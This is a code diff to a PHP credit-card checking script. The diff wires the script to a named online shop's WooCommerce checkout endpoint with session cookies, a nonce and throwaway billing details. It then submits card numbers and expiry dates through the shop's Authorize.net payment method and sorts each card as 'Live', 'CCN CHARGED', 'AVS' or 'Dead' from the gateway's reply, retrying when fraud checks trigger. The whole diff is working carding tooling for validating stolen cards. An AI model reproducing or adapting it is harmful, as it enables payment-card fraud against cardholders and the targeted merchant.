@@ -285,7 +285,7 @@ switch ($trans) {
 #AJAXCHECKOUT
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, '');
+curl_setopt($ch, CURLOPT_URL, 'https://zoomerdisplay.com/checkout/?wc-ajax=checkout');
 //curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -298,25 +298,25 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 //curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 //curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: application/json, text/javascript, */*; q=0.01',
-'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-'',
+'accept: application/json, text/javascript, */*; q=0.01',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: woocommerce_items_in_cart=1; woocommerce_cart_hash=06a00181e19277ab08206fc90d44059a; wp_woocommerce_session_89858b6dffb2ae03261aed9737bb7cae=cd1f1bf0cfbfbf0e059a8898cd440a41%7C%7C1725086014%7C%7C1725082414%7C%7C6c70ea879ce1733f23fea14d2eee04fa',
 //'X-IYZI-TOKEN: a4acc271-2b04-43e9-a91d-930dd9854de9',
-'Origin: ',
-'Referer: ',
-'Sec-Fetch-Site: same-origin',
-'Sec-Fetch-Mode: cors',
+'origin: https://zoomerdisplay.com',
+'referer: https://zoomerdisplay.com/checkout/',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: cors',
 //'Sec-Fetch-User: ?1',
-'Sec-Fetch-Dest: empty'
+'sec-fetch-dest: empty'
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=dsfgsjd&billing_last_name=gfdsdf&billing_company=&billing_country=US&billing_address_1=635+Street&billing_address_2=&billing_city=ny&billing_state=NY&billing_postcode=10010&billing_phone=9152237725&billing_email=sdfgkhjsdujk%40jhgdhjkf.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=authorizenet_lightweight&authorizenet_lightweight-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&authorizenet_lightweight-card-expiry='.$mes.'+%2F+'.$ano1.'&authorizenet_lightweight-card-cvc=&_wpnonce=43294ba9f6&_wp_http_referer=%2Fcheckout%2F%3Fwc-ajax%3Dupdate_order_review');
 $pagamento = curl_exec($ch);
 $ch = curl_init();
 //---------------------------------------------------------------------------------------------   
 
 //$err = GetStr($pagamento, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"');
 
-//$err = GetStr($pagamento, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"');
+$err = GetStr($pagamento, '"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>','<\/li>\n\t<\/ul>\n"');
 //
 //
 ////$err = GetStr($pagamento1, '"notice":"','"');
@@ -325,43 +325,43 @@ $ch = curl_init();
 //
 // //-----------------------------------------------------
 //
-//if(strpos($pagamento,"success")) {
-//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ LIVE ]</i></font> <font class='badge badge-warning'> CCN CHARGED [$20] </i></font><br>";
-//
-//}
-//elseif(strpos($pagamento, 'There was an error processing your payment. Reason: Invalid postal code or street address.')){
-//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
-//
-//}
-//elseif(strpos($pagamento, 'There was an error processing your payment. Reason: Invalid postal code and cvv')){
-//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
-//
-//}
-//elseif(strpos($pagamento, 'There was an error processing your payment. Reason: CVV.')){
-//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
-//
-//}
-//elseif(strpos($pagamento, 'Card Issuer Declined CVV')){
-//echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ CCN AUTH ]</i></font> <font class='badge badge-warning'>CVV: AUTH </i></font><br>";
-//
-//}
-//elseif(strpos($pagamento,'cart')) {
-//echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>ded</i></font> <font class='badge badge-primary'>[$ip]</i></font><br>";
-//}
-//elseif(strpos($pagamento,'cart')) {
-//echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>ded</i></font> <font class='badge badge-primary'>[$ip]</i></font><br>";
-//}
-//elseif(strpos($pagamento, 'risk_threshold')) {
-//goto retry;
-//$ret++;
-//}
-//elseif(strpos($pagamento, 'Not enough units')) {
-//goto retry;
-//$ret++;
-//} 
-//else {
-//   echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>$err</i></font> <font class='badge badge-primary'>[$ip1]</i></font><br>";
-//} 
+if(strpos($pagamento,"success")) {
+echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ LIVE ]</i></font> <font class='badge badge-warning'> CCN CHARGED [$20] </i></font><br>";
+
+}
+elseif(strpos($pagamento, 'The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder.')){
+echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ LIVE ]</i></font> <font class='badge badge-warning'>CCN: AVS </i></font><br>";
+
+}
+elseif(strpos($pagamento, 'There was an error processing your payment. Reason: Invalid postal code and cvv')){
+echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
+
+}
+elseif(strpos($pagamento, 'There was an error processing your payment. Reason: CVV.')){
+echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ $err ]</i></font> <font class='badge badge-warning'>CVV: AVS </i></font><br>";
+
+}
+elseif(strpos($pagamento, 'Card Issuer Declined CVV')){
+echo "<font size=3 color='dark'><font class='badge badge-success'>Live</i></font> <font class='badge badge-success'> $lista </font> <font size=3 color='green'><font class='badge badge-success'>[ CCN AUTH ]</i></font> <font class='badge badge-warning'>CVV: AUTH </i></font><br>";
+
+}
+elseif(strpos($pagamento,'cart')) {
+echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>ded</i></font> <font class='badge badge-primary'>[$ip]</i></font><br>";
+}
+elseif(strpos($pagamento,'cart')) {
+echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>ded</i></font> <font class='badge badge-primary'>[$ip]</i></font><br>";
+}
+elseif(strpos($pagamento, 'risk_threshold')) {
+goto retry;
+$ret++;
+}
+elseif(strpos($pagamento, 'Not enough units')) {
+goto retry;
+$ret++;
+} 
+else {
+   echo "<font size=3 color='dark'><font class='badge badge-danger'>Reprovada ☠</i></font> <font class='badge badge-danger'> $lista </i></font> <font size=3 color='red'><font class='badge badge-warning'>Dead</i></font> <font class='badge badge-dark'>$err</i></font> <font class='badge badge-primary'>[$ip1]</i></font><br>";
+} 
 
 
 curl_close($ch);
